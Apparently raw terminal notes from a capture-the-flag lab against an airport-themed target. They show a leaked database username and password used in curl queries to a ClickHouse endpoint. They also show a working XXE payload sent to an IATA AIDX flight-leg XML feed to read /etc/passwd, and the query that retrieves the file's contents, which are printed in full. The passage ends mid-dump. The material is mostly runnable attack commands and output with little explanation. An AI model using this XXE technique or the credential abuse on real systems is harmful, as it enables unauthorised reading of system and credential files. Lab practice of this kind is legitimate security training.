om.zaxxer.hikari.util.Credentials:
[password = Yl4aCgh4y2PnU, username = svc_events]




DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$AUTH" --data-binary 'SHOW DATABASES' "$DB"
curl -s -u "$AUTH" --data-binary 'SELECT database, name, engine FROM system.tables FORMAT Pretty' "$DB"



┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -X POST "http://api.htb-airport.htb:8081/feeds/aidx" \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><IATA_AIDX_FlightLegNotifRQ><Originator>LH</Originator><FlightLeg><LegIdentifier><Airline>LH</Airline><FlightNumber>102</FlightNumber><DepartureAirport>FRA</DepartureAirport><ArrivalAirport>MUC</ArrivalAirport><OriginDate>2026-08-20</OriginDate><RepeatNumber>1</RepeatNumber></LegIdentifier><LegData><RemarkFreeText>&xxe;</RemarkFreeText></LegData></FlightLeg></IATA_AIDX_FlightLegNotifRQ>'
{"accepted":true,"topic":"aidx.flightleg.raw.v1"}                                                                                                                                                                                                                                           
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ DB='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s -u "$AUTH" --data-binary \
  'SELECT * FROM partner_feed.flightleg_json ORDER BY ingested DESC LIMIT 1 FORMAT Vertical' "$DB"
Row 1:
──────
transaction_id:     
originator:         
message_type:       IATA_AIDX_FlightLegNotifRQ
version:            
msg_timestamp:      
airline:            LH
flight_number:      102
departure_airport:  FRA
arrival_airport:    MUC
origin_date:        2026-08-20
repeat_number:      1
operational_status: 
event:              {"message_type":"IATA_AIDX_FlightLegNotifRQ","version":null,"timestamp":null,"transaction_id":null,"originator":null,"leg":{"ufi":{"airline":"LH","flight_number":"102","suffix":null,"departure_airport":"FRA","arrival_airport":"MUC","origin_date":"2026-08-20","repeat_number":"1"},"operational_status":null,"times":{},"all_fields":{"LegIdentifier":{"Airline":"LH","FlightNumber":"102","DepartureAirport":"FRA","ArrivalAirport":"MUC","OriginDate":"2026-08-20","RepeatNumber":"1"},"LegData":{"RemarkFreeText":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:101:102::/nonexistent:/usr/sbin/nologin\nsystemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\npollinate:x:102:1::/var/cache/pollinate:/bin/false\npolkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\nsyslog:x:103:104::/nonexistent:/usr/sbin/nologin\nuuidd:x:104:105::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:105:107::/nonexistent:/usr/sbin/nologin\ntss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin\nusbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:999:988::/var/log/laurel:/bin/false\nsvc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash\nclickhouse:x:996:987::/nonexistent:/bin/false\nmartin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash\ndhcpcd:x:100:65534:DHCP Client 

